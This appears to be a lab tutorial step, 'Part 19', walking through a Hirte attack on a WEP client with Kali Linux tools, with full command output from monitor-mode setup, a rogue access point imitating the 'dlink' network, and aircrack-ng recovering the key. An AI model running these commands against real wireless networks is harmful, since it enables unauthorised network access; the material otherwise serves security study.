#### Part	19: Fragmentation and Hirte Attack

```Client side attack``` just like ```Caffe Latte Attack```

Before connecting the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 51830  bytes 3435415 (3.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 47066  bytes 33321752 (31.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 248  bytes 12512 (12.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 248  bytes 12512 (12.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```	
	
Connect the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 113  bytes 13062 (12.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 116  bytes 19058 (18.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig -a
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 124  bytes 13940 (13.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 123  bytes 20732 (20.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4098<BROADCAST,MULTICAST>  mtu 1500
        ether 00:c0:ca:92:3c:89  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig wlan0 up
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 377  bytes 30254 (29.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 169  bytes 26425 (25.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether ae:ac:75:a7:71:b2  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```

Put the card in monitor mode

```sh
root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~# airmon-ng start wlan0

Found 3 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to run 'airmon-ng check kill'

  PID Name
  400 NetworkManager
  569 dhclient
  804 wpa_supplicant

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)

root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0mon	rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~#
```

Check for the monitor mode interface

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 518  bytes 40324 (39.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 236  bytes 35799 (34.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 00-C0-CA-92-3C-89-30-30-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 858  bytes 151521 (147.9 KiB)
        RX errors 0  dropped 858  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

root@kali:~#
```

Run ```Airodump-ng```

```sh
root@kali:~# airodump-ng --channel 4 wlan0mon --essid dlink --write Hirte

 CH  4 ][ Elapsed: 4 mins ][ 2017-06-07 03:04 ][ Broken SKA: 00:C0:CA:92:3C:89

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 00:C0:CA:92:3C:89    0   0     5573    20474  133   4  54   WEP  WEP    SKA  dlink
 84:C9:B2:6D:0C:85  -37  67     1677      295    3   4  11e. WEP  WEP         dlink

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 00:C0:CA:92:3C:89  BC:9F:EF:69:35:19  -33    1 -36      0   168929  dlink,HiddenSSID
 (not associated)   06:FF:7B:94:41:2F  -49    0 - 1      0        4
 (not associated)   2A:D8:0B:8E:D3:A5  -49    0 - 1      0        1
 (not associated)   DA:A1:19:1C:D0:82  -52    0 - 1      0        1
 (not associated)   3C:BB:FD:98:55:54  -59    0 - 1      0        8
 (not associated)   F4:F5:D8:2F:99:D0  -62    0 - 1      0       29  Lowspeed
 (not associated)   F8:16:54:BD:7A:7C  -65    0 - 1      0        2  Orange
 (not associated)   F4:F5:D8:49:3D:C4  -66    0 - 1      0        1  Phanisri
 (not associated)   5C:51:88:9E:3C:95  -67    0 - 1      0        2
 (not associated)   A4:70:D6:99:25:FC  -68    0 - 1      0        6
 (not associated)   BE:F5:50:72:66:C9  -50    0 - 1      0        1
 (not associated)   02:3D:31:EB:17:0A  -51    0 - 1      0        4
 (not associated)   E2:07:A6:63:5F:8A  -52    0 - 1      0        2
 (not associated)   64:80:99:D7:8E:03  -67    0 - 1      0        3  Kaiser,ATT016
 (not associated)   80:D2:1D:15:A2:B9  -60    0 - 1      0        9  NETGEAR36
 (not associated)   B0:70:2D:2E:E7:21  -57    0 - 1      0        9  xfinitywifi
 (not associated)   E8:50:8B:4D:0A:4B  -63    0 - 1      0        2

root@kali:~#
```

Create a soft AP and make sure the client connects to it

```sh
root@kali:~# airbase-ng --channel 4 --essid dlink -W 1 wlan0mon -N
For information, no action required: Using gettimeofday() instead of /dev/rtc
03:00:00  Created tap interface at1
03:00:00  Trying to set MTU on at1 to 1500
03:00:00  Access Point with BSSID 00:C0:CA:92:3C:89 started.
03:00:03  Broken SKA: BC:9F:EF:69:35:19 (expected: 164, got 151 bytes)
03:00:03  SKA from BC:9F:EF:69:35:19
03:00:04  Broken SKA: BC:9F:EF:69:35:19 (expected: 164, got 151 bytes)
03:00:04  Broken SKA: BC:9F:EF:69:35:19 (expected: 164, got 151 bytes)
03:00:04  Broken SKA: BC:9F:EF:69:35:19 (expected: 164, got 151 bytes)
03:00:04  SKA from BC:9F:EF:69:35:19
03:00:04  Client BC:9F:EF:69:35:19 associated (WEP) to ESSID: "dlink"
03:00:04  Broken SKA: BC:9F:EF:69:35:19 (expected: 164, got 151 bytes)
03:00:04  Broken SKA: BC:9F:EF:69:35:19 (expected: 164, got 151 bytes)
03:00:04  Broken SKA: BC:9F:EF:69:35:19 (expected: 164, got 151 bytes)
03:00:04  SKA from BC:9F:EF:69:35:19
03:00:05  Client BC:9F:EF:69:35:19 associated (WEP) to ESSID: "dlink"
03:00:05  Starting Hirte attack against BC:9F:EF:69:35:19 at 100 pps.
03:00:30  Starting Hirte attack against BC:9F:EF:69:35:19 at 100 pps.
03:01:58  Starting Hirte attack against BC:9F:EF:69:35:19 at 100 pps.
03:03:15  Starting Hirte attack against BC:9F:EF:69:35:19 at 100 pps.
03:04:30  Starting Hirte attack against BC:9F:EF:69:35:19 at 100 pps.
root@kali:~#
```

Run ```aircrack-ng``` to obtain the key

```sh
root@kali:~# aircrack-ng Hirte-01.cap
Opening Hirte-01.cap
Read 211673 packets.

   #  BSSID              ESSID                     Encryption

   1  00:C0:CA:92:3C:89  dlink                     WEP (19398 IVs)
   2  84:C9:B2:6D:0C:85  dlink                     WEP (275 IVs)

Index number of target network ? 1

Opening Hirte-01.cap
Attack will be restarted every 5000 captured ivs.
Starting PTW attack with 19718 ivs.

                                           Aircrack-ng 1.2 rc4


                           [00:00:01] Tested 9977 keys (got 19630 IVs)

   KB    depth   byte(vote)
    0    7/ 10   AA(24320) C4(24320) EF(24320) 1C(24064) 31(24064) 66(24064) 3F(23808)
    1    6/ 17   BB(24064) 3D(24064) 7F(24064) 8E(24064) E7(23808) 70(23552) 99(23552)
    2    0/  1   CC(28416) 00(25344) 7D(24832) C9(24832) 1E(24064) 8D(24064) 9A(24064)
    3   10/ 12   C7(24064) 0E(23808) 10(23808) D9(23808) 25(23552) 4C(23552) 8C(23552)
    4    0/  5   EE(27136) 9A(26880) C8(26624) 6D(25344) 70(25088) 60(24576) 38(24320)

                         KEY FOUND! [ AA:BB:CC:DD:EE ]
	Decrypted correctly: 100%


root@kali:~#
```

<---Add image here--->